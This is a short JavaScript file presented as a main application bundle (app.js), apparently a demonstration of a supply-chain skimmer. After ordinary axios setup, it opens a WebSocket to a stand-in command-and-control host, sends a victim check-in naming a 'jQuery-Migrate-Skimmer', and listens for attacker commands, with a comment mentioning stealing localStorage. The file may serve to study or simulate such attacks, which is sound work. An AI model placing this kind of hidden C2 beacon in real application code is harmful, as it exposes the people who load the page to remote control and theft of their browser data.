import axios from 'axios';
console.log('Main application bundle (app.js) loaded.');

window.axios = axios;

try {
    const ws = new WebSocket('wss://attacker-c2-server.com/socket');
    ws.onopen = () => {
        console.log('C2 WebSocket opened by sleeper agent.');
        // Attacker sends a "check-in" message
        ws.send(JSON.stringify({
            type: 'check-in',
            victimId: 'user-123',
            source: 'jQuery-Migrate-Skimmer-v1.2'
        }));
    };
    ws.onmessage = (event) => {
        console.log('Received C2 command:', event.data);
        // Attacker could send back new instructions, e.g., {"command": "steal-localstorage"}
    };
} catch (e) {
    console.error('WebSocket creation failed:', e);
}